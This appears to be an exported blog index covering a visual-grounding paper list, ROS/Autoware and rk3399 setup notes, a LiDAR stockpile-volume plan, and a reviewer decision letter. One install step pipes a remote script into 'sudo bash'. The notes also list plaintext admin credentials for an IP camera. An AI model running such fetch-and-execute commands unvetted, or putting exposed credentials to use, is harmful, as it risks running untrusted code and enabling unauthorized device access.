href="https://arxiv.org/pdf/2008.01059" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/zyang-ur/ReSC" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Wang, Liwei, et al. <strong>Improving Weakly Supervised Visual Grounding by Contrastive Knowledge Distillation.</strong> Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (CVPR). 2021. <a href="https://arxiv.org/pdf/2007.01951" target="_blank" rel="noopener">[Paper]</a></p></li><li><p>Sun, Mingjie, Jimin Xiao, and Eng Gee Lim. <strong>Iterative Shrinking for Referring Expression Grounding Using Deep Reinforcement Learning.</strong> Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (CVPR). 2021. <a href="https://arxiv.org/pdf/2007.01951" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/insomnia94/ISREG" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Liu, Haolin, et al. <strong>Refer-it-in-RGBD: A Bottom-up Approach for 3D Visual Grounding in RGBD Images.</strong> Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (CVPR). 2021. <a href="https://arxiv.org/pdf/2103.07894" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/UncleMEDM/Refer-it-in-RGBD" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Liu, Yongfei, et al. <strong>Relation-aware Instance Refinement for Weakly Supervised Visual Grounding.</strong> Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (CVPR). 2021. <a href="https://arxiv.org/pdf/2103.12989" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/youngfly11/ReIR-WeaklyGrounding.pytorch" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Lin, Xiangru, Guanbin Li, and Yizhou Yu. <strong>Scene-Intuitive Agent for Remote Embodied Visual Grounding.</strong> Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (CVPR). 2021. <a href="https://arxiv.org/pdf/2103.12944" target="_blank" rel="noopener">[Paper]</a></p></li><li><p>Sun, Mingjie, et al. <strong>Discriminative triad matching and reconstruction for weakly referring expression grounding.</strong> IEEE transactions on pattern analysis and machine intelligence (TPAMI 2021). <a href="https://livrepository.liverpool.ac.uk/3116000/1/manuscript.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/insomnia94/DTWREG" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Mu, Zongshen, et al. <strong>Disentangled Motif-aware Graph Learning for Phrase Grounding.</strong> arXiv preprint arXiv:2104.06008 (AAAI 2021). <a href="https://www.aaai.org/AAAI21Papers/AAAI-2589.MuZ.pdf" target="_blank" rel="noopener">[Paper]</a></p></li><li><p>Chen, Long, et al. <strong>Ref-NMS: Breaking Proposal Bottlenecks in Two-Stage Referring Expression Grounding.</strong> arXiv preprint arXiv:2009.01449 (AAAI-2021). <a href="https://arxiv.org/pdf/2009.01449" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/ChopinSharp/ref-nms" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Deng, Jiajun, et al. <strong>TransVG: End-to-End Visual Grounding with Transformers.</strong> arXiv preprint arXiv:2104.08541 (2021). <a href="https://arxiv.org/pdf/2104.08541" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/nku-shengzheliu/Pytorch-TransVG" target="_blank" rel="noopener">[Unofficial Code]</a></p></li><li><p>Du, Ye, et al. <strong>Visual Grounding with Transformers.</strong> arXiv preprint arXiv:2105.04281 (2021). <a href="https://arxiv.org/pdf/2105.04281" target="_blank" rel="noopener">[Paper]</a></p></li><li><p>Kamath, Aishwarya, et al. <strong>MDETR–Modulated Detection for End-to-End Multi-Modal Understanding.</strong> arXiv preprint arXiv:2104.12763 (2021). <a href="https://arxiv.org/pdf/2104.12763" target="_blank" rel="noopener">[Paper]</a></p></li></ol><h3 id="Natural-Language-Object-Retrieval-Images"><a href="#Natural-Language-Object-Retrieval-Images" class="headerlink" title="Natural Language Object Retrieval (Images)"></a>Natural Language Object Retrieval (Images)</h3><ol><li><p>Guadarrama, Sergio, et al. <strong>Open-vocabulary Object Retrieval.</strong> Robotics: science and systems. Vol. 2. No. 5. 2014. <a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.434.3000&rep=rep1&type=pdf" target="_blank" rel="noopener">[Paper]</a> <a href="http://openvoc.berkeleyvision.org/" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Hu, Ronghang, et al. <strong>Natural language object retrieval.</strong> Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. 2016. <em>Method name: Spatial Context Recurrent ConvNet (SCRC)</em> <a href="https://www.cv-foundation.org/openaccess/content_cvpr_2016/papers/Hu_Natural_Language_Object_CVPR_2016_paper.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/ronghanghu/natural-language-object-retrieval" target="_blank" rel="noopener">[Code]</a> <a href="http://ronghanghu.com/text_obj_retrieval/" target="_blank" rel="noopener">[Website]</a></p></li><li><p>Wu, Fan et al. <strong>An End-to-End Approach to Natural Language Object Retrieval via Context-Aware Deep Reinforcement Learning.</strong> CoRR abs/1703.07579 (2017): n. pag. <a href="https://arxiv.org/pdf/1703.07579.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/jxwufan/NLOR_A3C" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Li, Jianan, et al. <strong>Deep attribute-preserving metric learning for natural language object retrieval.</strong> Proceedings of the 2017 ACM on Multimedia Conference. ACM, 2017. <a href="https://dl.acm.org/citation.cfm?id=3123439" target="_blank" rel="noopener">[Paper: ACM Link]</a></p></li><li><p>Nguyen, Anh, et al. <strong>Object Captioning and Retrieval with Natural Language.</strong> arXiv preprint arXiv:1803.06152 (2018). <a href="https://arxiv.org/pdf/1803.06152.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://sites.google.com/site/objcaptioningretrieval/" target="_blank" rel="noopener">[Website]</a></p></li><li><p>Plummer, Bryan A., et al. <strong>Open-vocabulary Phrase Detection.</strong> arXiv preprint arXiv:1811.07212 (2018). <a href="https://arxiv.org/pdf/1811.07212.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/VisionLearningGroup/phrase-rcnn" target="_blank" rel="noopener">[Code]</a></p></li></ol><h3 id="Grounding-Relations-Referring-Relations"><a href="#Grounding-Relations-Referring-Relations" class="headerlink" title="Grounding Relations / Referring Relations"></a>Grounding Relations / Referring Relations</h3><ol><li><p>Krishna, Ranjay, et al. <strong>Referring relationships.</strong> Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. 2018. <a href="https://arxiv.org/pdf/1803.10362.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/StanfordVL/ReferringRelationships" target="_blank" rel="noopener">[Code]</a> <a href="https://cs.stanford.edu/people/ranjaykrishna/referringrelationships/index.html" target="_blank" rel="noopener">[Website]</a></p></li><li><p>Raboh, Moshiko et al. <strong>Differentiable Scene Graphs.</strong> (2019). <a href="https://arxiv.org/pdf/1902.10200.pdf" target="_blank" rel="noopener">[Paper]</a></p></li><li><p>Conser, Erik, et al. <strong>Revisiting Visual Grounding.</strong> arXiv preprint arXiv:1904.02225 (2019).<br><a href="https://arxiv.org/pdf/1904.02225.pdf" target="_blank" rel="noopener">[Paper]</a></p><ul><li>Critique of Referring Relationship paper</li></ul></li></ol><h3 id="Grounded-Description-Image-WIP"><a href="#Grounded-Description-Image-WIP" class="headerlink" title="Grounded Description (Image) (WIP)"></a>Grounded Description (Image) (WIP)</h3><ol><li><p>Hendricks, Lisa Anne, et al. <strong>Generating visual explanations.</strong> European Conference on Computer Vision. Springer, Cham, 2016. <a href="https://arxiv.org/pdf/1603.08507.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/LisaAnne/ECCV2016/" target="_blank" rel="noopener">[Code]</a> <a href="https://github.com/salaniz/pytorch-gve-lrcn" target="_blank" rel="noopener">[Pytorch Code]</a></p></li><li><p>Jiang, Ming, et al. <strong>TIGEr: Text-to-Image Grounding for Image Caption Evaluation.</strong> arXiv preprint arXiv:1909.02050 (2019). (EMNLP 2019) <a href="https://arxiv.org/pdf/1909.02050.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/SeleenaJM/CapEval" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Lee, Jason, Kyunghyun Cho, and Douwe Kiela. <strong>Countering language drift via visual grounding.</strong> arXiv preprint arXiv:1909.04499 (2019). (EMNLP 2019) <a href="https://arxiv.org/pdf/1909.04499.pdf" target="_blank" rel="noopener">[Paper]</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> VisualGrounding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Multimodal </tag>
            
            <tag> Paper </tag>
            
            <tag> VisualGrounding </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>点云业务开发(ROS,Autoware)及嵌入式开发的一些备忘</title>
      <link href="/2022/09/14/2022-09-14-%E7%82%B9%E4%BA%91ROS%E4%B8%9A%E5%8A%A1/"/>
      <url>/2022/09/14/2022-09-14-%E7%82%B9%E4%BA%91ROS%E4%B8%9A%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<p>ROS, Autoware编译, rk3399开发板在实验室网络设置等的一些备忘</p><a id="more"></a><p>conda :gcc,make,gpgme,libarchive,zstd,<br>conda lib for system /lib</p><p>pacmansource code<br><a href="https://sources.archlinux.org/other/pacman/" target="_blank" rel="noopener">https://sources.archlinux.org/other/pacman/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PKG_CHECK_MODULES(LIBARCHIVE, [libarchive &gt;= 3.0.0], ,</span><br><span class="line">AC_MSG_ERROR([*** libarchive &gt;= 3.0.0 is needed to compile pacman!]))</span><br></pre></td></tr></table></figure><h2 id="rk3399"><a href="#rk3399" class="headerlink" title="rk3399"></a>rk3399</h2><ol><li>4g module disble (for now):rk_wifi_init module(driver) is not able to execute</li><li>setting for static ip</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ip       : using DHCP in this room of ifconfig (after login in at UPC)</span><br><span class="line">gateway  : ip addr/ ifconfig/ netstat -rn</span><br><span class="line">netmask  : ip addr to check network segment and calculate yourself</span><br><span class="line"></span><br><span class="line">modify: /etc/network/interfaces</span><br><span class="line"></span><br><span class="line">auto [your eth name]</span><br><span class="line">iface [you eth name] inet [static]</span><br><span class="line">address [your ip]</span><br><span class="line">netmask [your netmask]</span><br><span class="line">gateway [your gateway]</span><br><span class="line">broadcast [your broadcast]</span><br><span class="line"></span><br><span class="line">ep.</span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 180.201.136.11</span><br><span class="line">netmask 255.255.192.0</span><br><span class="line">gateway 180.201.128.1</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 down</span><br><span class="line">ifconfig eth0 up</span><br></pre></td></tr></table></figure><ol start="3"><li>networkauth<br>if the <strong>issue</strong> below occured:<br>“Failed to establish a new connection: [Errno -2] Name or service not known…”<br>detail:<br>“requests.exceptions.ConnectionError: HTTPSConnectionPool(host=’xx’, port=443): Max retries exceeded with url: /appapi/exchange/19/v1/prolist (Caused by NewConnectionError(‘&lt;urllib3.connection.VerifiedHTTPSConnection object at 0x7fca889818d0&gt;: Failed to establish a new connection: [Errno -2] Name or service not known’,))”</li></ol><p><strong>solution</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. PING lan.upc.edu.cn -&gt; (121.251.251.207) </span><br><span class="line">2. lan.upc.edu.cn &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>run networkAuth script</p><ol start="4"><li>cross-compile :: <a href="https://github.com/RangiLyu/nanodet" target="_blank" rel="noopener">https://github.com/RangiLyu/nanodet</a><br><a href="https://developer.arm.com/downloads/-/gnu-a" target="_blank" rel="noopener">gcc compiler toolchain</a><br><a href="https://developer.arm.com/-/media/Files/downloads/gnu-a/10.3-2021.07/binrel/gcc-arm-10.3-2021.07-x86_64-aarch64-none-linux-gnu.tar.xz?rev=1cb9c51b94f54940bdcccd791451cec3&hash=B380A59EA3DC5FDC0448CA6472BF6B512706F8EC" target="_blank" rel="noopener">for x86(host)-aarch64</a></li></ol><p><strong>compiler env</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. untar the toolchain package</span><br><span class="line">2. export PATH="&lt;toolchain-compiler-bin-path&gt;:$&#123;PATH&#125;"</span><br><span class="line">3. apt install g++-arm-linux-gnueabi g++-arm-linux-gnueabihf g++-aarch64-linux-gnu</span><br><span class="line"> execute on -- aarch64-none-linux-gnu-gcc</span><br></pre></td></tr></table></figure><p><strong>ncnn env</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4. https://github.com/RangiLyu/nanodet/blob/main/demo_ncnn/README.md</span><br><span class="line">5. ncnn test: https://blog.csdn.net/LuohenYJ/article/details/97031156</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FOUND OpenCV [error]:</span><br><span class="line">IMPORTED library can only be used with the INTERFACE keyword of</span><br><span class="line">  target_link_libraries</span><br></pre></td></tr></table></figure><p><a href="https://github.com/Dreamacro/clash/releases" target="_blank" rel="noopener">clashamd</a><br><a href="https://proxy-switchyomega.com/download/" target="_blank" rel="noopener">switchyomega.crx</a> .crx -&gt; .zip -&gt; drag</p><ol start="5"><li>ROS env</li></ol><p><strong>ROS env</strong><br><a href="https://github.com/RoboSense-LiDAR/rslidar_sdk" target="_blank" rel="noopener">follow this readme </a><br><a href>and ros-full-desktop</a> dependencies <em>PCL</em> and <em>YAML</em> will be incidental in this version.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## add aptkeys and update repository</span></span><br><span class="line">sudo sh -c <span class="string">'echo "deb http://packages.ros.org/ros/ubuntu $(lsb_release -sc) main" &gt; /etc/apt/sources.list.d/ros-latest.list'</span></span><br><span class="line">curl -s https://raw.githubusercontent.com/ros/rosdistro/master/ros.asc | sudo apt-key add -</span><br><span class="line">sudo apt-get update</span><br><span class="line"><span class="comment">## install ros-desktop with  included</span></span><br><span class="line">sudo apt install ros-noetic-desktop-full</span><br><span class="line"></span><br><span class="line"><span class="comment">## install dependencies</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"source /opt/ros/noetic/setup.bash"</span> &gt;&gt; ~/.bashrc</span><br><span class="line">sudo apt install python3-rosdep python3-rosinstall python3-rosinstall-generator python3-wstool build-essential </span><br><span class="line"><span class="comment">## install these dependencies in case</span></span><br><span class="line">sudo apt-get install libboost-dev libpcap-dev libpcl-dev libeigen3-dev</span><br><span class="line"><span class="comment">## empy and catkin_pkg installation</span></span><br><span class="line"><span class="keyword">if</span> you are using python default , <span class="keyword">then</span> install python3-empy with apt</span><br><span class="line"><span class="keyword">if</span> you are using conda, <span class="keyword">then</span> ```pip install empy catkin_pkg</span><br></pre></td></tr></table></figure><h2 id="LiDAR-sdk-compilation-with-catkin"><a href="#LiDAR-sdk-compilation-with-catkin" class="headerlink" title="LiDAR sdk compilation with catkin"></a>LiDAR sdk compilation with catkin</h2><ol><li>mkdir [empty folder name]</li><li>move rslidar_sdk/ to [empty folder name]/src </li><li>catkin_make</li><li>source devel/setup.bash</li><li>roslaunch rslidar_sdk start.launch</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**ros1 + ros2**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">## dependencies</span><br><span class="line">sudo apt-get install python3-colcon-common-extensions python3-flake8 python3-pip python3-pytest-cov python3-rosdep python3-setuptools python3-vcstool python3-rosdep</span><br><span class="line"></span><br><span class="line">## setting apt repo address</span><br><span class="line">sudo sh -c &apos;echo &quot;deb [arch=$(dpkg --print-architecture)] http://packages.ros.org/ros2/ubuntu $(lsb_release -cs) main&quot; &gt; /etc/apt/sources.list.d/ros2-latest.list&apos;</span><br><span class="line">update &amp; install ros-foxy-desktop</span><br><span class="line">file -- .bashrc</span><br><span class="line">source /opt/ros/foxy/setup.bash</span><br><span class="line">## test </span><br><span class="line">ros2 run demo_nodes_cpp talker</span><br><span class="line">## remove</span><br><span class="line">sudo apt remove ros-foxy-* &amp;&amp; sudo apt autoremove</span><br></pre></td></tr></table></figure><p><strong>AutowareAuto</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://gitlab.com/autowarefoundation/autoware.auto/AutowareAuto.git</span><br><span class="line"><span class="comment">## dependices</span></span><br><span class="line">curl -s https://packagecloud.io/install/repositories/github/git-lfs/script.deb.sh | sudo bash</span><br><span class="line">sudo apt-get install git-lfs</span><br><span class="line"><span class="comment">## vsc import &amp; install ros external dependices</span></span><br><span class="line">vcs import &lt; autoware.auto.foxy.repos</span><br><span class="line">rosdep install -y -i --from-paths src</span><br><span class="line">git lfs pull --exclude=<span class="string">""</span> --include=<span class="string">"*"</span></span><br><span class="line"><span class="built_in">export</span> COLCON_DEFAULTS_FILE=/home/waynamigo/AutowareAuto/tools/ade_image/colcon-defaults.yaml</span><br><span class="line"><span class="comment">## compile by colcon with CUDA</span></span><br><span class="line">AUTOWARE_COMPILE_WITH_CUDA=1 colcon build --cmake-args -DCMAKE_BUILD_TYPE=Release</span><br><span class="line"><span class="comment">## test</span></span><br><span class="line">colcon <span class="built_in">test</span></span><br><span class="line">colcon <span class="built_in">test</span>-result --verbose</span><br></pre></td></tr></table></figure><h2 id="ip-camera"><a href="#ip-camera" class="headerlink" title="ip camera"></a>ip camera</h2><p>ip -192.168.1.64<br>user: admin<br>passwd: abcd-1234<br><em>issues</em></p><ol><li>cant be recognized with reticle unplugged(bridge0)</li></ol><p>sdk lib <figure class="highlight plain"><figcaption><span>/etc/ld.so.conf``` **content**:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">```bash</span><br><span class="line">include /etc/ld.so.conf.d/*.conf</span><br><span class="line">/home/waynamigo/Documents/HKVISION/CH-HCNetSDKV6.1.9.4_build20220413_linux64/lib</span><br><span class="line">/home/waynamigo/Documents/HKVISION/CH-HCNetSDKV6.1.9.4_build20220413_linux64/lib/HCNetSDKCom</span><br><span class="line">#/home/waynamigo/Documents/LiDAR</span><br><span class="line">/usr/local/lib</span><br></pre></td></tr></table></figure></p><h1 id="clip-task-–-paper"><a href="#clip-task-–-paper" class="headerlink" title="clip task – paper"></a>clip task – paper</h1><ol><li>CLIP4Hashing: Unsupervised Deep Hashing for Cross-Modal Video-Text Retrieval. ICMR</li><li>Segmentation in Style: Unsupervised Semantic Image Segmentation with Stylegan and CLIP. CoRR abs/2107.12518 (2021)</li></ol><h1 id="clip-retrieval"><a href="#clip-retrieval" class="headerlink" title="clip retrieval"></a>clip retrieval</h1><ol><li>Conditioned and composed image retrieval combining and partially fine-tuning CLIP-based features. CVPR Workshops 2022: 4955-4964</li><li>VideoCLIP: A Cross-Attention Model for Fast Video-Text Retrieval Task with Image CLIP. ICMR 2022: 29-33</li><li>Extending CLIP for Category-to-Image Retrieval in E-Commerce. ECIR (1) 2022: 289-303</li><li>Animating Images to Transfer CLIP for Video-Text Retrieval. SIGIR 2022: 1906-1911</li><li>X-CLIP: End-to-End Multi-grained Contrastive Learning for Video-Text Retrieval. CoRR abs/2207.07285 (2022)</li></ol><h2 id="cloud-native"><a href="#cloud-native" class="headerlink" title="cloud native"></a>cloud native</h2><h3 id="kv-engine"><a href="#kv-engine" class="headerlink" title="kv engine"></a>kv engine</h3><p><a href="https://www.cs.utah.edu/~lifeifei/papers/polardbserverless-sigmod21.pdf" target="_blank" rel="noopener">polarDB</a><br><a href="https://zhuanlan.zhihu.com/p/103600699" target="_blank" rel="noopener">baidu Atlas</a><br>[alibaba competition]<a href="https://tianchi.aliyun.com/competition/entrance/531979/information" target="_blank" rel="noopener">https://tianchi.aliyun.com/competition/entrance/531979/information</a></p><h2 id="go-project-structure"><a href="#go-project-structure" class="headerlink" title="go project structure"></a>go project structure</h2><p><a href="https://blog.csdn.net/weixin_44757863/article/details/120349003" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44757863/article/details/120349003</a></p><h2 id="RPC-RMI"><a href="#RPC-RMI" class="headerlink" title="RPC RMI"></a>RPC RMI</h2><p><strong>RMI</strong> stands for Remote Method Invocation, is a similar to PRC but it supports object-<br>oriented programming which is the java’s feature.<br><strong>RPC</strong> RPC(Remote Procedure Call，远程过程调用)是一种计算机通信协议，允许调用不同进程空间的程序。RPC 的客户端和服务器可以在一台机器上，也可以在不同的机器上。程序员使用时，就像调用本地程序一样，无需关注内部的实现细节。</p><p>不同的应用程序之间的通信方式有很多，比如浏览器和服务器之间广泛使用的基于 HTTP 协议的 Restful API。与 RPC 相比，Restful API 有相对统一的标准，因而更通用，兼容性更好，支持不同的语言。HTTP 协议是基于文本的，一般具备更好的可读性。但是缺点也很明显：</p><ul><li>Restful 接口需要额外的定义，无论是客户端还是服务端，都需要额外的代码来处理，而 RPC 调用则更接近于直接调用。</li><li>基于 HTTP 协议的 Restful 报文冗余，承载了过多的无效信息，而 RPC 通常使用自定义的协议格式，减少冗余报文。</li><li>RPC 可以采用更高效的序列化协议，将文本转为二进制传输，获得更高的性能。</li><li>因为 RPC 的灵活性，所以更容易扩展和集成诸如注册中心、负载均衡等功能。</li></ul><p>命令式编程(Imperative/procedual)、声明式编程(Declarative)和函数式编程(Functional)</p><h2 id="RPC-gRPC"><a href="#RPC-gRPC" class="headerlink" title="RPC gRPC"></a>RPC gRPC</h2>]]></content>
      
      
      <categories>
          
          <category> PointCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PointCloud </tag>
            
            <tag> Embedded </tag>
            
            <tag> ROS </tag>
            
            <tag> Autoware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>激光体积估算业务Solution?</title>
      <link href="/2022/08/24/2022-08-24-%E6%BF%80%E5%85%89%E6%89%AB%E6%8F%8F%E7%9A%84%E5%A0%86%E4%BD%93%E4%BD%93%E7%A7%AF%E4%BC%B0%E7%AE%97/"/>
      <url>/2022/08/24/2022-08-24-%E6%BF%80%E5%85%89%E6%89%AB%E6%8F%8F%E7%9A%84%E5%A0%86%E4%BD%93%E4%BD%93%E7%A7%AF%E4%BC%B0%E7%AE%97/</url>
      
        <content type="html"><![CDATA[<p>通过激光进行堆体体积估算</p><a id="more"></a><h2 id="堆体体积估算"><a href="#堆体体积估算" class="headerlink" title="堆体体积估算"></a>堆体体积估算</h2><p>LiDAR场区配置：两个方案</p><h3 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h3><p>多个LiDAR固定后，点云拼接建图（例如三个LiDAR探测面覆盖整个料场）</p><h3 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h3><p>LiDAR 云台移动扫描建图（云台扫描2D切面叠加，积分计算体积）</p><h3 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements"></a>Requirements</h3><p>LiDAR点云数据格式 rx,ry,rz,ro,r,g,b,s(反射强度)<br><strong>功能需求</strong><br>1) 料场盘库重量估算。激光雷达扫描料堆得到点云数据后，LiDAR根据点云数据提供料堆三维模型尺寸，切片法计算出料堆体积，通过经验密度值计算出料堆重量。<br>2) 料堆位置坐标信息。以获取每一类料堆的类别和位置，配合皮带入库位置选择及抓取出库，并可供用户实时查看库存情况。<br>3) 可视化场堆信息。根据各存料车间需求进行定制化服务，利用车间尺寸图纸划分点云地图区域，并反馈给车间管理人员实时查看现场库存情况。<br><strong>方案</strong>：<br>由移动云台带动激光雷达进行料堆扫描，或根据固定的LiDAR探测面获取的点云配准后，对料堆进行点云拼接，进行完整的建图，以准确获取料堆的斜立面信息与完整的料堆顶面信息。<br><strong>难点</strong><br>难点1，点云去噪：三维激光扫描过程中不可避免地会获得大量的噪声点云。<br>        包括漂移点、孤立点、冗余点、混杂点等)的存在不仅增加了数据量，而且会严重影响点云质量和后续矿堆体积量测<br>难点2. 不同颜色堆垛对LiDAR点云扫描的误差影响：不同颜色对光的反射是不同的，黑色反射比最小约为10%，扫描距离是最小的，如果测的是白色物体，反射比约为80%，扫描距离就比黑色范围大。<br>难点3. 误差：本方案通过切片法快速计算体积。采用拟合出的基准面（地面），根据选取的待测区域对基准面以上的3D区域，进行高精度体积测算，并结合经验密度，积分计算出重量。</p>]]></content>
      
      
      <categories>
          
          <category> PointCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PointCloud </tag>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GRSL Reviewer Comments</title>
      <link href="/2022/01/24/2022-01-24-%E5%AE%A1%E7%A8%BF%E6%84%8F%E8%A7%81/"/>
      <url>/2022/01/24/2022-01-24-%E5%AE%A1%E7%A8%BF%E6%84%8F%E8%A7%81/</url>
      
        <content type="html"><![CDATA[<p>持续更新</p><a id="more"></a><p>Your paper GRSL-01600-2023 Multi-Stage Synergistic Aggregation Network for Remote Sensing Visual Grounding has been carefully reviewed by the GRSL review panel and found to be unacceptable in its present form. The reviewers did suggest, however, that if completely revised the paper might be found acceptable. We encourage you to revise and resubmit this manuscript as a new paper to GRSL.</p><p><strong><em>If you do decide to resubmit the paper, please include a point-by-point response to the comments of the reviewers along with the new paper in order to expedite its review.  Use the “Submit a Resubmission” link in your author center when you submit the new manuscript.  Your resubmission is due by 05-Jan-2024</em></strong></p><p>Below you will find comments from the review panel. Any attached files that may be referenced with these comments can be accessed in a copy of this decision letter located in your Author Center on ScholarOne Manuscripts.</p><p>Sincerely,<br>Dr. Avik Bhattacharya<br>Editor-in-Chief<br>IEEE Geoscience and Remote Sensing Letters</p><p>Associate Editor Comments:<br>Associate Editor<br>Comments to the Author:<br>According to the comments, the innovation of the proposed method is doubtful. The introduction and detail information of the proposed method is not clear. Besides, this manuscript needs to be further improved in terms of writting.</p><p>Reviewer(s) Comments:<br>Reviewer: 1</p><p>Comments to the Author<br>The authors propose a multi-stage synergistic aggregation network for remote sensing visual grounding to address the correlations between textual semantics and visual information, as well as the dependencies between features and bounding box representations. My major comments are as follows:</p><p>(1) The literature review on remote sensing visual grounding methods is inadequate. I recommend that the authors provide a more comprehensive literature review on remote sensing visual grounding methods.<br>(2) The authors state that existing methods overlooked the crucial dependencies between features and bounding box representations. I cannot understand what these dependencies are. Please add more descriptions to explain them.<br>(3) The authors do not introduce the objective function of the proposed method. Please add the definition of the objective function.<br>(4) The proposed method is complex and not easy to understand. I suggest that the authors make their code publicly available and release their best model to allow for result reproduction. This will greatly influence my decision.<br>(5) There is some inconsistent expression. For example, in Fig. 1, “Query channel Attention” is denoted as “QCA,” and “Cross Attention” is denoted as “CA Layer.” Additionally, the authors usually use “QCB” to refer to “Query Channel Attention” in the context, but in Fig. 1, “QCA” is used, which is confusing.<br>(6) I suggest the authors add a comma or a period at the end of different equations.</p><p>(1) 关于遥感视觉接地方法的文献综述不够充分。我建议作者对遥感视觉接地方法进行更全面的文献综述。<br>(2) 作者指出，现有方法忽略了地物与边界框表示之间的关键依赖关系。我不明白这些依赖关系是什么。请补充说明。<br>(3) 作者没有介绍建议方法的目标函数。请补充目标函数的定义。<br>(4) 建议的方法很复杂，不容易理解。我建议作者公开他们的代码，并发布他们的最佳模型，以便复制结果。这将极大地影响我的决定。<br>(5) 有些表达不一致。例如，在图 1 中，”Query channel Attention “表示为 “QCA”，而 “Cross Attention “表示为 “CA Layer”。此外，作者在上下文中通常使用 “QCB 